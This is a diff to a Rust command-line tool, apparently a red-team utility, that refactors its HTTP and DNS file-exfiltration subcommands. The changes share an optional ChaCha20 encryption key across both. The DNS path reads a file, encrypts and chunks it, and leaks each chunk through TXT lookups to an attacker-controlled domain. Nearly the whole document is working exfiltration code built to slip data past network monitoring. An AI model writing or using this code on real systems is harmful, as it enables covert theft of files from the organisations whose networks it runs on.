@@ -11,11 +11,26 @@ over different protocols. Two primary approaches are provided:
 Each command type implements `CommandHandler` and performs its work when
 `handle()` is invoked by the top-level CLI dispatch.
 */
-
 use clap::{Args, Subcommand, ValueEnum};
+use hickory_resolver::name_server::TokioConnectionProvider;
 use std::path::PathBuf;
 
 use crate::CommandHandler;
+
+trait ExfiltrateCommandHandler {
+    fn encrypt_payload(
+        &self,
+        cipher_key: &str,
+        payload_bytes: Vec<u8>,
+        root_node: &crate::nodes::root::RootNode,
+    ) -> crate::error::Result<Vec<u8>> {
+        let root_node_str = root_node.to_string();
+        let nonce = root_node_str.as_bytes().last_chunk::<12>().unwrap();
+        crate::ciphers::chacha20_encrypt(cipher_key, nonce, payload_bytes)
+    }
+
+    fn handle(self, args: ExfiltrationArgs) -> crate::error::Result<()>;
+}
 
 /// HTTP-based exfiltration subcommand arguments.
 ///
@@ -50,27 +65,9 @@ pub struct HTTPExfiltrationSubCommand {
         value_parser=clap::value_parser!(u16).range(1..)
     )]
     chunks: u16,
-
-    // TODO!: Add custom key type format: str=<key_string>, file=<key_file_path>, url=<key_url>
-    /// Optional cipher key for encrypting the payload
-    #[arg(long = "cipher-key", required = false)]
-    cipher_key: Option<String>,
 }
 
-impl HTTPExfiltrationSubCommand {
-    fn encrypt_payload(
-        &self,
-        payload_bytes: Vec<u8>,
-        root_node: &crate::nodes::root::RootNode,
-    ) -> crate::error::Result<Vec<u8>> {
-        let key = self.cipher_key.as_ref().unwrap();
-        let root_node_str = root_node.to_string();
-        let nonce = root_node_str.as_bytes().last_chunk::<12>().unwrap();
-        crate::ciphers::chacha20_encrypt(key, nonce, payload_bytes)
-    }
-}
-
-impl CommandHandler for HTTPExfiltrationSubCommand {
+impl ExfiltrateCommandHandler for HTTPExfiltrationSubCommand {
     /// Execute the HTTP exfiltration flow.
     ///
     /// Notes:
@@ -91,10 +88,7 @@ impl CommandHandler for HTTPExfiltrationSubCommand {
     /// # Errors
     /// - Returns an error if file reading, encryption, chunking,
     /// encoding, or HTTP requests fail.
-    ///
-    /// # Panics
-    /// - Panics if the provided cipher key is invalid for ChaCha20-Poly1305.
-    fn handle(self) -> crate::error::Result<()> {
+    fn handle(self, args: ExfiltrationArgs) -> crate::error::Result<()> {
         for file_path in self.files_path.iter() {
             log::debug!("Reading file {}", file_path.to_string_lossy());
 
@@ -103,9 +97,9 @@ impl CommandHandler for HTTPExfiltrationSubCommand {
 
             let mut file_bytes = crate::encoders::buffered_read_file(&file_path)?;
 
-            if self.cipher_key.is_some() {
+            if let Some(cipher_key) = args.cipher_key.as_ref() {
                 log::info!("Encrypting payload with provided cipher key.");
-                file_bytes = self.encrypt_payload(file_bytes, &root_node)?;
+                file_bytes = self.encrypt_payload(cipher_key, file_bytes, &root_node)?;
             }
 
             let chunk_nodes = crate::encoders::http::build_chunk_nodes(
@@ -114,8 +108,11 @@ impl CommandHandler for HTTPExfiltrationSubCommand {
                 self.chunks as usize,
             )?;
 
-            let mut nodes = vec![crate::nodes::Node::Root(root_node)];
-            nodes.extend(chunk_nodes);
+            let nodes = {
+                let mut temp_nodes = vec![crate::nodes::Node::Root(root_node)];
+                temp_nodes.extend(chunk_nodes);
+                temp_nodes
+            };
 
             log::info!(
                 "Sending {} chunks to {} with {}ms delay between requests.",
@@ -168,6 +165,7 @@ pub struct DNSExfiltrationSubCommand {
     /// File to exfiltrate
     #[arg(short = 'f', long = "src-file", required = true)]
     file_path: PathBuf,
+
     /// Destination of the exfiltrated file
     #[arg(short = 'd', long = "dest", required = true)]
     destination: String,
@@ -190,24 +188,8 @@ pub struct DNSExfiltrationSubCommand {
     nameserver: Option<std::net::SocketAddr>,
 }
 
-impl CommandHandler for DNSExfiltrationSubCommand {
-    /// Execute the DNS exfiltration flow.
-    ///
-    /// Notes:
-    /// - The resolver uses the `hickory_resolver` crate and will build an
-    ///   async resolver instance. If a `nameserver` is provided, it will be
-    /// used; otherwise, the system default resolver configuration is used.
-    ///
-    /// - Each encoded chunk is emitted as a TXT lookup for `<chunk>.<destination>.`
-    ///   to the configured resolver; this allows an authoritative server for
-    ///   `destination` to receive the payload via the query name.
-    fn handle(self) -> crate::error::Result<()> {
-        log::info!("Reading file {}", self.file_path.to_string_lossy());
-        log::info!("Encoding payload.");
-
-        let payload_chunks =
-            crate::encoders::dns::encode_payload_dns_safe(&self.file_path, &self.destination)?;
-
+impl DNSExfiltrationSubCommand {
+    fn build_dns_resolver(&self) -> hickory_resolver::Resolver<TokioConnectionProvider> {
         let resolver_config = match self.nameserver {
             Some(name_server) => {
                 log::info!("Setting DNS resolver {:?}", self.nameserver);
@@ -221,17 +203,65 @@ impl CommandHandler for DNSExfiltrationSubCommand {
             }
             None => hickory_resolver::config::ResolverConfig::default(),
         };
-
-        let tokio_runtime = tokio::runtime::Runtime::new().expect("Failed to create tokio runtime");
-        let resolver = hickory_resolver::Resolver::builder_with_config(
+        hickory_resolver::Resolver::builder_with_config(
             resolver_config,
-            hickory_resolver::name_server::TokioConnectionProvider::default(),
+            TokioConnectionProvider::default(),
         )
-        .build();
+        .build()
+    }
+}
 
-        for chunk in payload_chunks.iter() {
-            let dns_query = format!("{}.{}.", chunk, self.destination);
-            log::info!("Sending chunk: {}", dns_query);
+impl ExfiltrateCommandHandler for DNSExfiltrationSubCommand {
+    /// Execute the DNS exfiltration flow.
+    ///
+    /// # Arguments
+    /// - `args`: ExfiltrationArgs containing optional cipher key for encryption.
+    ///
+    /// Notes:
+    /// - The resolver uses the `hickory_resolver` crate and will build an
+    ///   async resolver instance. If a `nameserver` is provided, it will be
+    /// used; otherwise, the system default resolver configuration is used.
+    ///
+    /// - Each encoded chunk is emitted as a TXT lookup for `<chunk>.<destination>.`
+    ///   to the configured resolver; this allows an authoritative server for
+    ///   `destination` to receive the payload via the query name.
+    fn handle(self, args: ExfiltrationArgs) -> crate::error::Result<()> {
+        let resolver = self.build_dns_resolver();
+        let tokio_runtime = tokio::runtime::Runtime::new().expect("Failed to create tokio runtime");
+
+        log::debug!("Reading file {}", self.file_path.to_string_lossy());
+
+        let root_node = crate::nodes::root::RootNode::try_from(&self.file_path)?;
+        log::info!("Exfiltrating file '{}'", root_node.file_name);
+
+        let mut file_bytes = crate::encoders::buffered_read_file(&self.file_path)?;
+
+        if let Some(cipher_key) = args.cipher_key.as_ref() {
+            log::info!("Encrypting payload with provided cipher key.");
+            file_bytes = self.encrypt_payload(cipher_key, file_bytes, &root_node)?;
+        }
+
+        let chunk_nodes = crate::encoders::dns::build_chunk_nodes(
+            std::rc::Rc::clone(&root_node.file_identifier),
+            self.destination.len(),
+            file_bytes,
+        )?;
+
+        let encoded_nodes = {
+            let mut temp_nodes = vec![crate::nodes::Node::Root(root_node)];
+            temp_nodes.extend(chunk_nodes);
+            crate::encoders::dns::encode_payload(temp_nodes)?
+        };
+
+        log::info!(
+            "Sending {} chunks to {} with {}ms delay between requests.",
+            encoded_nodes.len(),
+            self.destination,
+            self.delay
+        );
+        for encoded_node in encoded_nodes {
+            let dns_query = format!("{}.{}.", encoded_node, self.destination);
+            log::debug!("Sending node: {}", dns_query);
 
             tokio_runtime.block_on(resolver.txt_lookup(dns_query))?;
 
@@ -242,6 +272,14 @@ impl CommandHandler for DNSExfiltrationSubCommand {
     }
 }
 
+#[derive(Debug, Args)]
+pub struct ExfiltrationArgs {
+    // TODO!: Add custom key type format: str=<key_string>, file=<key_file_path>, url=<key_url>
+    /// Optional cipher key for encrypting the payload
+    #[arg(long = "cipher-key", required = false, global = true)]
+    cipher_key: Option<String>,
+}
+
 /// Wrapper struct for the `exfil` subcommand family.
 ///
 /// This struct delegates to a chosen `ExfiltrationType` subcommand (HTTP or DNS)
@@ -250,14 +288,17 @@ impl CommandHandler for DNSExfiltrationSubCommand {
 pub struct ExfiltrationSubCommandArgs {
     #[command(subcommand)]
     exfil_type: ExfiltrationType,
+
+    #[command(flatten)]
+    args: ExfiltrationArgs,
 }
 
 impl CommandHandler for ExfiltrationSubCommandArgs {
     /// Execute the selected exfiltration variant.
     fn handle(self) -> crate::error::Result<()> {
         match self.exfil_type {
-            ExfiltrationType::HTTP(exfil_http_subcmd) => exfil_http_subcmd.handle()?,
-            ExfiltrationType::DNS(exfil_dns_subcmd) => exfil_dns_subcmd.handle()?,
+            ExfiltrationType::HTTP(exfil_http_subcmd) => exfil_http_subcmd.handle(self.args)?,
+            ExfiltrationType::DNS(exfil_dns_subcmd) => exfil_dns_subcmd.handle(self.args)?,
         };
 
         Ok(())
